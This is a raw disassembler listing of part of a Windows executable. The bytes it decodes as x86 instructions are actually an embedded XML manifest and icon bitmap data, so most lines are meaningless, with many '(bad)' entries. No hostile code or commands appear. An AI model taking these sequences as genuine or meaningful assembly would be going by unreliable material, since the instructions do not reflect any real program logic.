  404728:	imul   esi,DWORD PTR [ecx+edi*2+0x3e],0x2f3c0a0d
  404730:	je     0x4047a4
  404732:	jne    0x4047a7
  404734:	je     0x40477f
  404736:	outs   dx,BYTE PTR ds:[esi]
  404737:	outs   dx,WORD PTR ds:[esi]
  404739:	ds or  eax,0x73613c0a
  40473f:	ins    DWORD PTR es:[edi],dx
  404740:	jbe    0x404775
  404742:	cmp    ah,BYTE PTR [ecx+0x70]
  404745:	jo     0x4047b3
  404747:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  40474e:	ds or  eax,0x2020200a
  404754:	cmp    al,0x61
  404756:	jae    0x4047c5
  404758:	jbe    0x40478d
  40475a:	cmp    dh,BYTE PTR [edi+0x69]
  40475d:	outs   dx,BYTE PTR ds:[esi]
  40475e:	outs   dx,DWORD PTR fs:[esi]
  404760:	ja     0x4047d5
  404762:	push   ebx
  404763:	gs je  0x4047da
  404766:	imul   ebp,DWORD PTR [esi+0x67],0x6d782073
  40476d:	ins    BYTE PTR es:[edi],dx
  40476e:	outs   dx,BYTE PTR ds:[esi]
  40476f:	jae    0x4047ae
  404771:	and    ch,BYTE PTR [eax+0x74]
  404774:	je     0x4047e6
  404776:	cmp    ch,BYTE PTR [edi]
  404778:	das    
  404779:	jae    0x4047de
  40477b:	push   0x73616d65
  404780:	cs ins DWORD PTR es:[edi],dx
  404782:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  404789:	je     0x4047b9
  40478b:	arpl   WORD PTR [edi+0x6d],bp
  40478e:	das    
  40478f:	push   ebx
  404790:	dec    ebp
  404791:	dec    ecx
  404792:	das    
  404793:	xor    dh,BYTE PTR [eax]
  404795:	xor    BYTE PTR ds:0x6e69572f,dh
  40479b:	outs   dx,DWORD PTR fs:[esi]
  40479d:	ja     0x404812
  40479f:	push   ebx
  4047a0:	gs je  0x404817
  4047a3:	imul   ebp,DWORD PTR [esi+0x67],0xd3e2273
  4047aa:	or     ah,BYTE PTR [eax]
  4047ac:	and    BYTE PTR [eax],ah
  4047ae:	and    BYTE PTR [eax],ah
  4047b0:	and    BYTE PTR [eax],ah
  4047b2:	and    BYTE PTR [ecx+eiz*2],bh
  4047b5:	jne    0x40482b
  4047b7:	outs   dx,DWORD PTR ds:[esi]
  4047b8:	inc    ebp
  4047b9:	ins    BYTE PTR es:[edi],dx
  4047ba:	gs jbe 0x40481e
  4047bd:	je     0x404824
  4047bf:	ds je  0x404834
  4047c2:	jne    0x404829
  4047c4:	cmp    al,0x2f
  4047c6:	popa   
  4047c7:	jne    0x40483d
  4047c9:	outs   dx,DWORD PTR ds:[esi]
  4047ca:	inc    ebp
  4047cb:	ins    BYTE PTR es:[edi],dx
  4047cc:	gs jbe 0x404830
  4047cf:	je     0x404836
  4047d1:	ds or  eax,0x2020200a
  4047d7:	cmp    al,0x2f
  4047d9:	popa   
  4047da:	jae    0x404849
  4047dc:	jbe    0x404811
  4047de:	cmp    dh,BYTE PTR [edi+0x69]
  4047e1:	outs   dx,BYTE PTR ds:[esi]
  4047e2:	outs   dx,DWORD PTR fs:[esi]
  4047e4:	ja     0x404859
  4047e6:	push   ebx
  4047e7:	gs je  0x40485e
  4047ea:	imul   ebp,DWORD PTR [esi+0x67],0xa0d3e73
  4047f1:	cmp    al,0x2f
  4047f3:	popa   
  4047f4:	jae    0x404863
  4047f6:	jbe    0x40482b
  4047f8:	cmp    ah,BYTE PTR [ecx+0x70]
  4047fb:	jo     0x404869
  4047fd:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  404804:	ds or  eax,0x612f3c0a
  40480a:	jae    0x40487f
  40480c:	gs ins DWORD PTR es:[edi],dx
  40480e:	bound  ebp,QWORD PTR [ecx+edi*2+0x3e]
  404812:	or     eax,0xa
  404817:	add    BYTE PTR [eax],ch
  404819:	add    BYTE PTR [eax],al
  40481b:	add    BYTE PTR [eax],dh
  40481d:	add    BYTE PTR [eax],al
  40481f:	add    BYTE PTR [eax+0x0],ah
  404822:	add    BYTE PTR [eax],al
  404824:	add    DWORD PTR [eax],eax
  404826:	add    al,0x0
  404828:	add    BYTE PTR [eax],al
  40482a:	add    BYTE PTR [eax],al
  40482c:	add    BYTE PTR [eax+eax*1],0x0
	...
  404844:	add    BYTE PTR [eax],al
  404846:	add    BYTE PTR [eax],0x0
  404849:	add    BYTE PTR [eax],0x0
  40484c:	add    BYTE PTR [eax+0x800080],al
  404852:	add    BYTE PTR [eax],al
  404854:	add    BYTE PTR [eax],0x80
  404857:	add    BYTE PTR [eax-0x7fffff80],al
  40485d:	add    BYTE PTR [eax-0x3f3f4000],0x0
  404864:	add    BYTE PTR [eax],al
  404866:	inc    DWORD PTR [eax]
  404868:	add    bh,bh
  40486a:	add    BYTE PTR [eax],al
  40486c:	add    bh,bh
  40486e:	inc    DWORD PTR [eax]
  404870:	inc    DWORD PTR [eax]
  404872:	add    BYTE PTR [eax],al
  404874:	inc    DWORD PTR [eax]
  404876:	inc    DWORD PTR [eax]
  404878:	(bad)  
  404879:	inc    DWORD PTR [eax]
  40487b:	add    bh,bh
  40487d:	(bad)  
  40487e:	inc    DWORD PTR [eax]
	...
  4048d4:	or     BYTE PTR [eax+0x8888],cl
	...
  4048ea:	add    BYTE PTR [eax-0x7070071],cl
  4048f0:	mov    BYTE PTR [eax+0x0],cl
	...
  404902:	mov    al,bh
  404904:	clc    
  404905:	mov    BYTE PTR [eax-0x77770771],cl
	...
  404917:	add    BYTE PTR [eax],al
  404919:	mov    BYTE PTR [eax-0x70000778],cl
  40491f:	(bad)
  404923:	jo     0x404925
	...
  40492d:	add    BYTE PTR [eax],al
  40492f:	add    BYTE PTR [eax],cl
  404931:	mov    BYTE PTR [eax-0x7777008],cl
  404937:	mov    BYTE PTR [eax+0x877888],cl
	...
  404945:	add    BYTE PTR [eax],al
  404947:	add    BYTE PTR [eax],cl
  404949:	mov    BYTE PTR [eax-0x77070778],cl
  40494f:	vpmacssdql xmm0,xmm6,xmm0,XMMWORD PTR [edi+0x0]
  404959:	add    BYTE PTR [eax],al
  40495b:	add    BYTE PTR [eax],al
  40495d:	add    BYTE PTR [eax],al
  40495f:	add    BYTE PTR [eax],cl
  404961:	mov    BYTE PTR [eax-0x77077778],cl
  404967:	mov    BYTE PTR [eax+0x887777],cl
	...
  404975:	add    BYTE PTR [eax],al
  404977:	add    BYTE PTR [eax],cl
  404979:	mov    BYTE PTR [eax-0x7777778],cl
  40497f:	mov    BYTE PTR [edi+0x878787],al
  404985:	add    BYTE PTR [eax],al
  404987:	add    BYTE PTR [eax],al
  404989:	pop    es
  40498a:	ja     0x40498c
  40498c:	add    BYTE PTR [eax],al
  40498e:	add    BYTE PTR [eax],al
  404990:	add    BYTE PTR [eax-0x77777778],cl
  404996:	mov    BYTE PTR [eax+0x77],bh
  404999:	ja     0x404a13
  40499b:	js     0x4049a5
  40499d:	add    BYTE PTR [eax],0x0
  4049a0:	add    BYTE PTR [eax+0x7f],bh
  4049a3:	xchg   DWORD PTR [ecx+0x77],esi
  4049a6:	jo     0x4049a8
  4049a8:	add    BYTE PTR [eax],cl
  4049aa:	js     0x404934
  4049ac:	mov    BYTE PTR [edi+0x77077777],al
  4049b2:	mov    BYTE PTR [eax+0x8088],cl
  4049b8:	or     BYTE PTR [edi+0x77778878],al
  4049be:	clc    
  4049bf:	jo     0x4049c1
  4049c1:	add    BYTE PTR [eax],cl
  4049c3:	ja     0x40494c
  4049c5:	ja     0x404a3e
  4049c7:	ja     0x404950
  4049c9:	mov    BYTE PTR [eax+0x808888],cl
  4049cf:	add    BYTE PTR [eax],cl
  4049d1:	mov    BYTE PTR [eax-0x78],bh
  4049d4:	mov    BYTE PTR [edi+0x77],dh
  4049d7:	mov    BYTE PTR [eax+0x0],dh
  4049da:	add    BYTE PTR [eax],al
  4049dc:	xchg   DWORD PTR [edi+0x77],esi
  4049df:	js     0x404a59
  4049e1:	mov    BYTE PTR [eax+0x808888],cl
  4049e7:	add    BYTE PTR [eax],cl
  4049e9:	js     0x404973
  4049eb:	mov    BYTE PTR [eax-0x7888871],cl
  4049f1:	jo     0x4049f3
  4049f3:	xchg   DWORD PTR [edi-0x79],esi
  4049f6:	xchg   DWORD PTR [eax+0x6c7c8888],ecx
  4049fc:	mov    BYTE PTR [eax-0x77f80000],cl
  404a02:	js     0x40498b
  404a04:	js     0x40498e
  404a06:	push   DWORD PTR [edi+0x77]
  404a09:	js     0x404a83
  404a0b:	js     0x404994
  404a0d:	mov    BYTE PTR [eax-0x79],bh
  404a10:	jl     0x404a5e
  404a12:	inc    esp
  404a13:	les    ecx,FWORD PTR [eax+0x8000088]
  404a19:	mov    BYTE PTR [eax+0x77778787],cl
  404a1f:	xchg   DWORD PTR [eax-0x78],edi
  404a22:	mov    BYTE PTR [edi-0x3b9b8379],al
  404a28:	les    ebp,FWORD PTR [esp+ebp*2+0x64]
  404a2c:	mov    BYTE PTR [edi-0x77f80000],al
  404a32:	mov    BYTE PTR [edi+0x78877778],al
  404a38:	mov    BYTE PTR [edi+0x444c5677],al
  404a3e:	inc    esp
  404a3f:	dec    esp
  404a40:	ins    BYTE PTR es:[edi],dx
  404a41:	pop    esp
  404a42:	jl     0x404aa0
  404a44:	mov    BYTE PTR [eax-0x77f80000],cl
  404a4a:	mov    BYTE PTR [eax-0x78778788],cl
  404a50:	jbe    0x404aa6
  404a52:	inc    esp
  404a53:	inc    esp
  404a54:	inc    esp
  404a55:	inc    esp
  404a56:	mov    edi,0xc6c6c647
  404a5c:	jg     0x4049e5
  404a5e:	add    BYTE PTR [eax],al
  404a60:	or     BYTE PTR [eax-0x78777878],cl
  404a66:	inc    esi
  404a67:	inc    esp
  404a68:	inc    esp
  404a69:	inc    esp
  404a6a:	inc    esp
  404a6b:	dec    esp
  404a6c:	inc    esp
  404a6d:	fs dec esp
  404a6f:	ins    BYTE PTR es:[edi],dx
  404a70:	jl     0x404aee
  404a72:	jl     0x404af0
  404a74:	js     0x4049fe
  404a76:	add    BYTE PTR [eax],al
  404a78:	or     BYTE PTR [eax-0x78787878],cl
  404a7e:	inc    esp
  404a7f:	inc    esp
  404a80:	inc    esp
  404a81:	inc    esp
  404a82:	dec    esp
  404a83:	inc    esp
  404a84:	push   0x7c7cc784
  404a89:	jl     0x404a17
  404a8b:	mov    WORD PTR [eax-0x78],?
  404a8e:	add    BYTE PTR [eax],al
  404a90:	or     al,bh
  404a92:	mov    BYTE PTR [eax+0x56448878],cl
  404a98:	les    eax,FWORD PTR [esi+0x44]
  404a9b:	inc    esi
  404a9c:	mov    BYTE PTR [edi-0x737383b4],al
  404aa2:	out    0xc8,eax
  404aa4:	iret   
  404aa5:	xchg   DWORD PTR [eax],eax
  404aa7:	add    BYTE PTR [eax],cl
  404aa9:	mov    BYTE PTR [eax+0x46888887],cl
  404aaf:	les    esi,FWORD PTR [esp+ecx*2+0x44]
  404ab3:	push   0xc8488888
  404ab8:	enter  0xc8e7,0x7c
  404abc:	mov    al,bh
  404abe:	add    BYTE PTR [eax],al
  404ac0:	or     BYTE PTR [eax-0x77777788],cl
  404ac6:	push   esp
  404ac7:	je     0x404b0f
  404ac9:	push   esp
  404aca:	inc    esi
  404acb:	vpmacsswd xmm1,xmm6,xmm0,XMMWORD PTR [esp+r9d*4-0x37717379]
  404ad6:	add    BYTE PTR [eax],0x8
  404ad9:	mov    BYTE PTR [eax+0x64888888],cl
  404adf:	jl     0x404b5d
  404ae1:	fs js  0x404ae3
  404ae4:	pop    esp
  404ae5:	jg     0x404ade
  404ae7:	js     0x404ad1
  404ae9:	enter  0x7878,0x78
  404aed:	test   DWORD PTR [eax+0x78880800],0x74888888
  404af7:	jl     0x404b6d
  404af9:	inc    esp
  404afa:	pop    DWORD PTR [edi-0x3707373c]
  404b00:	js     0x404a89
  404b02:	ja     0x404b7c
  404b04:	enter  0x8088,0x0
  404b08:	or     BYTE PTR [eax-0x77777788],cl
  404b0e:	jl     0x404b84
  404b10:	jl     0x404b5e
  404b12:	ja     0x404ad8
  404b14:	mov    BYTE PTR [edi-0x71],0x88
  404b18:	ja     0x404aa1
  404b1a:	mov    cs,WORD PTR [eax+0x808888]
  404b20:	or     BYTE PTR [eax-0x78],bh
  404b23:	mov    BYTE PTR [eax+0x767c8488],cl
  404b29:	inc    esp
  404b2a:	les    ebp,FWORD PTR [esp+ecx*2-0x34]
  404b2e:	(bad)  
  404b2f:	test   DWORD PTR [edi-0x18787272],0x70f8
  404b39:	jp     0x404bb3
  404b3b:	mov    BYTE PTR [eax-0x3a887b78],cl
  404b41:	inc    esp
  404b42:	dec    esp
  404b43:	dec    esp
  404b44:	ins    BYTE PTR es:[edi],dx
  404b45:	dec    esp
  404b46:	js     0x404b40
  404b48:	js     0x404ad2
  404b4a:	mov    al,ch
  404b4c:	mov    BYTE PTR [eax+0x33000080],cl
  404b52:	js     0x404b4c
  404b54:	clc    
  404b55:	clc    
  404b56:	test   BYTE PTR [eax+0x6c],bh
  404b59:	dec    esp
  404b5a:	ins    BYTE PTR es:[edi],dx
  404b5b:	dec    esp
  404b5c:	dec    esp
  404b5d:	ins    BYTE PTR es:[edi],dx
  404b5e:	mov    BYTE PTR [edi-0x77777779],cl
  404b64:	xchg   DWORD PTR [eax+0x70000070],ecx
  404b6a:	js     0x404af4
  404b6c:	mov    BYTE PTR [edi+0x46c4c887],cl
  404b72:	(bad)  
  404b73:	(bad)  
  404b74:	int3   
  404b75:	into   
  404b76:	mov    BYTE PTR [eax-0x77777709],cl
  404b7c:	mov    BYTE PTR [edi+0x74000070],cl
  404b82:	js     0x404b7c
  404b84:	(bad)
  404b88:	dec    esp
  404b89:	dec    esp
  404b8a:	dec    esp
  404b8b:	ins    BYTE PTR es:[edi],dx
  404b8c:	mov    bh,0x88
  404b8f:	mov    BYTE PTR [eax-0x77777788],cl
  404b95:	mov    BYTE PTR [eax-0x77890000],cl
  404b9b:	(bad)  
  404b9c:	clc    
  404b9d:	pop    DWORD PTR [edi+0x6c4cc4c7]
  404ba3:	(bad)  
  404ba4:	int3   
  404ba5:	enter  0x8888,0x88
  404ba9:	mov    BYTE PTR [eax+0x788f888f],cl
  404baf:	add    BYTE PTR [eax],al
  404bb1:	js     0x88404bb6
  404bb7:	(bad)  
  404bb8:	dec    esp
  404bb9:	ins    BYTE PTR es:[edi],dx
  404bba:	dec    esp
  404bbb:	dec    esp
  404bbc:	int3   
  404bbd:	enter  0xf8f8,0x88
  404bc1:	mov    BYTE PTR [eax-0x77700108],cl
  404bc7:	add    BYTE PTR [eax],al
  404bc9:	add    BYTE PTR [eax],al
  404bcb:	mov    BYTE PTR [eax-0x3bbb7701],cl
  404bd1:	dec    esp
  404bd2:	ins    BYTE PTR es:[edi],dx
  404bd3:	mov    dh,0xcf
  404bd6:	(bad)
  404bda:	mov    al,bh
  404bdc:	clc    
  404bdd:	pop    DWORD PTR [edi+0x0]
  404be3:	add    BYTE PTR [eax],cl
  404be5:	mov    BYTE PTR [eax+0x4c6c4c44],cl
  404beb:	ins    BYTE PTR es:[edi],dx
  404bec:	int3   
  404bed:	mov    al,bh
  404bef:	(bad)  
  404bf0:	clc    
  404bf1:	mov    al,bh
  404bf3:	(bad)  
  404bf4:	clc    
  404bf5:	(bad)
  404bf9:	add    BYTE PTR [eax],al
  404bfb:	add    BYTE PTR [eax],al
  404bfd:	add    BYTE PTR [eax-0x333bbbb4],cl
  404c03:	int3   
  404c04:	ins    BYTE PTR es:[edi],dx
  404c05:	(bad)  
  404c06:	(bad)  
  404c07:	(bad)  
  404c08:	(bad)  
  404c09:	dec    DWORD PTR [edi-0x78707778]
  404c0f:	add    BYTE PTR [eax],al
  404c11:	add    BYTE PTR [eax],al
  404c13:	add    BYTE PTR [eax],al
  404c15:	add    BYTE PTR [eax],cl
  404c17:	inc    esp
  404c18:	mov    dh,0xc6
  404c1b:	(bad)  
  404c1c:	int3   
  404c1d:	(bad)  
  404c1e:	clc    
  404c1f:	clc    
  404c20:	mov    BYTE PTR [esi-0x10771778],cl
  404c26:	mov    BYTE PTR [eax],al
  404c28:	add    BYTE PTR [eax],al
  404c2a:	add    BYTE PTR [eax],al
  404c2c:	add    BYTE PTR [eax],al
  404c2e:	or     BYTE PTR [esp+eax*2-0x3c],ah
  404c32:	int3   
  404c33:	int3   
  404c34:	int3   
  404c35:	call   0x8928d4c8
  404c3a:	mov    al,bh
  404c3c:	clc    
  404c3d:	inc    DWORD PTR [eax+0x0]
  404c43:	add    BYTE PTR [eax],al
  404c45:	add    BYTE PTR [eax],cl
  404c47:	pop    esp
  404c48:	dec    esp
  404c49:	dec    esp
  404c4a:	fs jbe 0x404bd4
  404c4d:	mov    BYTE PTR [eax-0x70707078],cl
  404c53:	add    BYTE PTR [eax],0x0
	...
  404c5e:	or     BYTE PTR [esi+0x77],dh
  404c61:	mov    BYTE PTR [eax-0x70777071],cl
  404c67:	add    BYTE PTR [eax],0x0
	...
  404c76:	or     BYTE PTR [eax-0x7f707778],cl
	...
  404c8c:	add    BYTE PTR [eax],al
  404c8e:	add    al,dh
	...
  404d00:	(bad)  
  404d01:	(bad)  
  404d02:	(bad)  
  404d03:	(bad)  
  404d04:	(bad)  
  404d05:	inc    DWORD PTR [eax]
  404d07:	add    bh,bh
  404d09:	(bad)  
  404d0a:	(bad)  
  404d0b:	(bad)  
  404d0c:	(bad)  
  404d0d:	inc    DWORD PTR [eax]
  404d0f:	add    bh,bh
  404d11:	(bad)  
  404d12:	(bad)  
  404d13:	(bad)  
  404d14:	(bad)  
  404d15:	inc    DWORD PTR [eax]
  404d17:	add    bh,bh
  404d19:	(bad)  
  404d1a:	inc    DWORD PTR [eax+0xffff]
  404d20:	(bad)  
  404d21:	(bad)  
  404d22:	cld    
  404d23:	add    BYTE PTR [edi],cl
  404d25:	inc    DWORD PTR [eax]
  404d27:	add    bh,bh
  404d29:	push   eax
  404d2b:	add    BYTE PTR [ebx],al
  404d2d:	inc    DWORD PTR [eax]
  404d2f:	add    bh,bh
  404d31:	inc    eax
  404d33:	add    BYTE PTR [ecx],al
  404d35:	inc    DWORD PTR [eax]
  404d37:	add    bh,bh
  404d39:	inc    DWORD PTR [eax+0xff0000]
  404d3f:	add    bh,bh
  404d41:	inc    DWORD PTR [eax+0xff0000]
  404d47:	add    bh,bh
  404d49:	inc    DWORD PTR [eax+0xff0000]
  404d4f:	add    bh,bh
  404d51:	inc    DWORD PTR [eax+0xff0000]
  404d57:	add    bl,ah
  404d59:	inc    eax
  404d5b:	add    BYTE PTR [eax],al
  404d5d:	lahf   
  404d5e:	add    BYTE PTR [eax],al
  404d60:	rol    BYTE PTR [edi],0xe0
  404d63:	add    BYTE PTR [eax],al
  404d65:	pop    ds
  404d66:	add    BYTE PTR [eax],al
  404d68:	add    BYTE PTR [ecx],0xf8
  404d6b:	add    BYTE PTR [eax],al
  404d6d:	pop    ds
  404d6e:	add    BYTE PTR [eax],al
  404d70:	add    BYTE PTR [eax],0x7f
  404d73:	add    BYTE PTR [eax],al
  404d75:	pop    ds
  404d76:	add    BYTE PTR [eax],al
  404d78:	add    BYTE PTR [eax],0x1c
  404d7b:	add    BYTE PTR [eax],al
  404d7d:	sldt   WORD PTR [eax]
  404d80:	add    BYTE PTR [eax],0x0
  404d83:	add    BYTE PTR [eax],al
  404d85:	sldt   WORD PTR [eax]
  404d88:	add    BYTE PTR [eax],0x0
  404d8b:	add    BYTE PTR [eax],al
  404d8d:	sldt   WORD PTR [eax]
  404d90:	add    BYTE PTR [eax],0x0
  404d93:	add    BYTE PTR [eax],al
  404d95:	sldt   WORD PTR [eax]
  404d98:	add    BYTE PTR [eax],0x0
  404d9b:	add    BYTE PTR [eax],al
  404d9d:	sldt   WORD PTR [eax]
  404da0:	add    BYTE PTR [eax],0x0
  404da3:	add    BYTE PTR [eax],al
  404da5:	sldt   WORD PTR [eax]
  404da8:	add    BYTE PTR [eax],0x0
  404dab:	add    BYTE PTR [eax],al
  404dad:	sldt   WORD PTR [eax]
  404db0:	add    BYTE PTR [eax],0x0
  404db3:	add    BYTE PTR [eax],al
  404db5:	sldt   WORD PTR [eax]
  404db8:	add    BYTE PTR [eax],0x0
  404dbb:	add    BYTE PTR [eax],al
  404dbd:	sldt   WORD PTR [eax]
  404dc0:	add    BYTE PTR [eax],0x0
  404dc3:	add    BYTE PTR [eax],al
  404dc5:	pop    es
  404dc6:	add    BYTE PTR [eax],al
  404dc8:	add    BYTE PTR [eax],0x0
  404dcb:	add    BYTE PTR [eax],al
  404dcd:	pop    es
  404dce:	add    BYTE PTR [eax],al
  404dd0:	add    BYTE PTR [eax],0x0
  404dd3:	add    BYTE PTR [eax],al
  404dd5:	pop    es
  404dd6:	add    BYTE PTR [eax],al
  404dd8:	add    BYTE PTR [eax],0x0
  404ddb:	add    BYTE PTR [eax],al
  404ddd:	pop    es
  404dde:	add    BYTE PTR [eax],al
  404de0:	add    BYTE PTR [eax],0x0
  404de3:	add    BYTE PTR [eax],al
  404de5:	pop    es
  404de6:	add    BYTE PTR [eax],al
  404de8:	rol    BYTE PTR [eax],0x0
  404deb:	add    BYTE PTR [eax],al
  404ded:	pop    es
  404dee:	add    BYTE PTR [eax],al
  404df0:	rol    BYTE PTR [eax],0x0
  404df3:	add    BYTE PTR [eax],al
  404df5:	pop    es
  404df6:	add    BYTE PTR [eax],al
  404df8:	rol    BYTE PTR [eax],0x0
  404dfb:	add    BYTE PTR [eax],al
  404dfd:	pop    es
  404dfe:	add    BYTE PTR [eax],al
  404e00:	rol    BYTE PTR [eax],0x0
  404e03:	add    BYTE PTR [eax],al
  404e05:	add    eax,DWORD PTR [eax]
  404e07:	add    al,al
  404e09:	add    BYTE PTR [eax],al
  404e0b:	add    BYTE PTR [eax],al
  404e0d:	add    eax,DWORD PTR [eax]
  404e0f:	add    al,ah
  404e11:	add    BYTE PTR [eax],al
  404e13:	add    BYTE PTR [eax],al
  404e15:	add    eax,DWORD PTR [eax]
  404e17:	add    ah,bh
  404e19:	add    BYTE PTR [eax],al
  404e1b:	add    BYTE PTR [eax],al
  404e1d:	add    eax,DWORD PTR [eax]
  404e1f:	add    bh,bh
  404e21:	add    BYTE PTR [eax],0x0
  404e24:	add    BYTE PTR [ebx],al
  404e26:	add    BYTE PTR [eax],al
  404e28:	push   eax
  404e2a:	add    BYTE PTR [eax],al
  404e2c:	add    BYTE PTR [ebx],al
  404e2e:	add    BYTE PTR [eax],al
  404e30:	(bad)  
  404e31:	clc    
  404e32:	add    BYTE PTR [eax],al
  404e34:	add    BYTE PTR [ebx],al
  404e36:	add    BYTE PTR [eax],al
  404e38:	(bad)  
  404e39:	clc    
  404e3a:	add    BYTE PTR [eax],al
  404e3c:	add    BYTE PTR [edi],al
  404e3e:	add    BYTE PTR [eax],al
  404e40:	(bad)  
  404e41:	clc    
  404e42:	add    BYTE PTR [eax],al
  404e44:	add    edi,edi
  404e46:	add    BYTE PTR [eax],al
  404e48:	(bad)  
  404e49:	clc    
  404e4a:	add    BYTE PTR [ecx],al
  404e4c:	(bad)  
  404e4d:	inc    DWORD PTR [eax]
  404e4f:	add    bh,bh
  404e51:	clc    
  404e52:	add    edi,edi
  404e54:	(bad)  
  404e55:	inc    DWORD PTR [eax]
  404e57:	add    bh,bh
  404e59:	std    
  404e5a:	(bad)  
  404e5b:	(bad)  
  404e5c:	(bad)  
  404e5d:	inc    DWORD PTR [eax]
  404e5f:	add    bh,bh
  404e61:	(bad)  
  404e62:	(bad)  
  404e63:	(bad)  
  404e64:	(bad)  
  404e65:	inc    DWORD PTR [eax]
  404e67:	add    bh,bh
  404e69:	(bad)  
  404e6a:	(bad)  
  404e6b:	(bad)  
  404e6c:	(bad)  
  404e6d:	inc    DWORD PTR [eax]
  404e6f:	add    bh,bh
  404e71:	(bad)  
  404e72:	(bad)  
  404e73:	(bad)  
  404e74:	(bad)  
  404e75:	inc    DWORD PTR [eax]
  404e77:	add    bh,bh
  404e79:	(bad)  
  404e7a:	(bad)  
  404e7b:	(bad)  
  404e7c:	(bad)  
  404e7d:	inc    DWORD PTR [eax]
  404e7f:	add    BYTE PTR [eax],ch
  404e81:	add    BYTE PTR [eax],al
  404e83:	add    BYTE PTR [eax],ah
  404e85:	add    BYTE PTR [eax],al
  404e87:	add    BYTE PTR [eax+0x0],al
  404e8a:	add    BYTE PTR [eax],al
  404e8c:	add    DWORD PTR [eax],eax
  404e8e:	add    al,0x0
  404e90:	add    BYTE PTR [eax],al
  404e92:	add    BYTE PTR [eax],al
  404e94:	add    BYTE PTR [edx],al
	...
  404eae:	add    BYTE PTR [eax],0x0
  404eb1:	add    BYTE PTR [eax],0x0
  404eb4:	add    BYTE PTR [eax+0x800080],al
  404eba:	add    BYTE PTR [eax],al
  404ebc:	add    BYTE PTR [eax],0x80
  404ebf:	add    BYTE PTR [eax-0x7fffff80],al
  404ec5:	add    BYTE PTR [eax-0x3f3f4000],0x0
  404ecc:	add    BYTE PTR [eax],al
  404ece:	inc    DWORD PTR [eax]
  404ed0:	add    bh,bh
  404ed2:	add    BYTE PTR [eax],al
  404ed4:	add    bh,bh
  404ed6:	inc    DWORD PTR [eax]
  404ed8:	inc    DWORD PTR [eax]
  404eda:	add    BYTE PTR [eax],al
  404edc:	inc    DWORD PTR [eax]
  404ede:	inc    DWORD PTR [eax]
  404ee0:	(bad)  
  404ee1:	inc    DWORD PTR [eax]
  404ee3:	add    bh,bh
  404ee5:	(bad)  
  404ee6:	inc    DWORD PTR [eax]
	...
  404f10:	or     BYTE PTR [edi+0x88],cl
	...
  404f1e:	add    BYTE PTR [eax],cl
  404f20:	(bad)  
  404f21:	clc    
  404f22:	(bad)
	...
  404f2e:	or     BYTE PTR [edi-0x77707771],cl
  404f34:	mov    BYTE PTR [eax],al
	...
  404f3e:	mov    BYTE PTR [eax-0x77777071],cl
  404f44:	mov    BYTE PTR [eax+0x0],al
  404f4a:	add    BYTE PTR [eax],al
  404f4c:	add    BYTE PTR [eax],al
  404f4e:	mov    BYTE PTR [eax-0x77770708],cl
  404f54:	xchg   DWORD PTR [eax+0x0],eax
  404f5a:	add    BYTE PTR [eax],al
  404f5c:	add    BYTE PTR [eax],al
  404f5e:	mov    BYTE PTR [eax-0x78777778],cl
  404f64:	ja     0x404ee6
  404f66:	add    BYTE PTR [eax],al
  404f68:	add    BYTE PTR [edi+0x70],dh
  404f6b:	add    BYTE PTR [eax],al
  404f6d:	add    BYTE PTR [eax],cl
  404f6f:	mov    BYTE PTR [eax+0x78777788],cl
  404f75:	mov    BYTE PTR [eax-0x877f900],al
  404f7b:	ja     0x404ff5
  404f7d:	add    BYTE PTR [eax],al
  404f7f:	or     BYTE PTR [eax+0x77],bh
  404f82:	ja     0x404ffb
  404f84:	mov    BYTE PTR [edi-0x78f8ff78],cl
  404f8a:	mov    BYTE PTR [edi+0x8777],al
  404f90:	xchg   DWORD PTR [edi+0x78],esi
  404f93:	clc    
  404f94:	clc    
  404f95:	js     0x404f1f
  404f97:	add    BYTE PTR [eax],cl
  404f99:	xchg   DWORD PTR [eax+0x7777f778],ecx
  404f9f:	mov    BYTE PTR [eax+0x447c8888],cl
  404fa5:	(bad)  
  404fa6:	mov    BYTE PTR [eax],al
  404fa8:	pop    es
  404fa9:	mov    BYTE PTR [eax+0x77],bh
  404fac:	js     0x404f3d
  404fae:	clc    
  404faf:	mov    BYTE PTR [edi+0x44],dh
  404fb2:	inc    esp
  404fb3:	inc    esp
  404fb4:	mov    bh,0xf8
  404fb7:	add    BYTE PTR [eax],cl
  404fb9:	mov    BYTE PTR [edi+0x74878888],al
  404fbf:	inc    esp
  404fc0:	inc    esp
  404fc1:	dec    esp
  404fc2:	ins    BYTE PTR es:[edi],dx
  404fc3:	mov    edi,0x70088c7
  404fc9:	mov    BYTE PTR [eax+0x78],bh
  404fcc:	je     0x405012
  404fce:	inc    esp
  404fcf:	inc    esp
  404fd0:	inc    esi
  404fd1:	dec    esp
  404fd2:	ja     0x404f9b
  404fd4:	mov    edi,0x880800f7
  404fda:	mov    BYTE PTR [eax+0x44],bh
  404fdd:	inc    esp
  404fde:	inc    esp
  404fdf:	inc    esi
  404fe0:	mov    BYTE PTR [eax+ecx*8-0x38],al
  404fe4:	enter  0x88ce,0x0
  404fe8:	pop    es
  404fe9:	test   DWORD PTR [eax+0x64657488],0x7c77f848
  404ff3:	mov    ?,WORD PTR [edi+0x77]
  404ff6:	clc    
  404ff7:	add    BYTE PTR [eax],cl
  404ff9:	xchg   DWORD PTR [eax+0x47c77488],ecx
  404fff:	(bad)  
  405000:	pop    eax
  405001:	xchg   DWORD PTR [eax-0x77833738],ecx
  405007:	add    BYTE PTR [edi],al
  405009:	xchg   DWORD PTR [eax+0x787c8488],ecx
  40500f:	test   ah,0xf8
  405012:	enter  0x8888,0x88
  405016:	mov    BYTE PTR [eax],al
  405018:	pop    es
  405019:	xchg   DWORD PTR [eax-0x39887b78],ecx
  40501f:	push   esp
  405020:	les    edi,FWORD PTR [edi-0x79]
  405023:	xchg   DWORD PTR [esi+0x780f88c],ecx
  405029:	mov    bh,0x88
  40502b:	mov    BYTE PTR [esp+edi*2-0x37333bbc],al
  405032:	test   DWORD PTR [eax-0x7f777778],0x888f2707
  40503c:	hlt    
  40503d:	test   BYTE PTR [esp+ecx*2+0x6c],cl
  405041:	push   0x8888688f
  405046:	mov    BYTE PTR [eax-0x7077b8f9],al
  40504c:	xchg   esp,eax
  40504e:	mov    dh,0xcc
  405051:	iret   
  405052:	mov    BYTE PTR [eax+0x70888888],cl
  405058:	or     BYTE PTR [eax-0x1],bh
  40505b:	clc    
  40505c:	xchg   DWORD PTR [esp+ebp*2+0x4c],eax
  405060:	int3   
  405061:	(bad)
  405065:	clc    
  405066:	pop    DWORD PTR [eax-0x77f800]
